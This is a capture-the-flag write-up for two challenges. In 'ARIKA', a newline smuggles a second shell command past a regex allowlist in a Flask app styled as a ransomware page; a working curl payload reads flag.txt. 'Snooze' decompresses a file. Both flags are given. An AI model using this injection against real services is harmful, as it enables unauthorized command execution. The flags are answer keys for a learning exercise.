# ARIKA

| Category | Author       |
| -------- | ------------ |
| 🌐 Web   | John Hammond |

> The Arika ransomware group likes to look slick and spiffy with their cool green-on-black terminal style website... but it sounds like they are worried about some security concerns of their own!

> **NOTE**
> 
> The password for the ZIP archive below is `arika`.

- App is a flask app that mimics a ransomware instructions page.
- The app allows the "victim" to execute some commands: `["leaks", "news", "contact", "help", "whoami", "date", "hostname", "clear"]`
- command is executed in local shell: `subprocess.run(["/bin/sh", "-c", cmd]`
- whitelist is used to limit commands: `re.match(r"^%s$" % allowed, command, len(ALLOWLIST))`
- To get to that piece of code, we need to pass a `command` which gets validated by the whitelist
- We can use a linebreak `\n` to append a 2nd command

```sh
$ curl -d '{"command": "hostname\ncat flag.txt"}' -H "Content-Type: application/json" http://localhost:5000
{"code":0,"ok":true,"stderr":"","stdout":"arika\nNOT-THE-REAL-FLAG"}
```

`flag{eaec346846596f7976da7e1adb1f326d}`

---

# Snooze

| Category   | Author       |
| ---------- | ------------ |
| 👶 Warmups | John Hammond |

> Don't bug me, I'm sleeping! Zzzz... zzz... zzzz....
> 
> Uncover the flag from the file presented.

!. Download the file
2. Run `file` on it
    ```
    snooze: compress'd data 16 bits
    ```
3. Some researchs reveals this is a Linux compressed file
4. Rename to `file.z` and run `uncompress snooze.z`

`flag{c1c07c90efa59876a97c44c2b175903e}`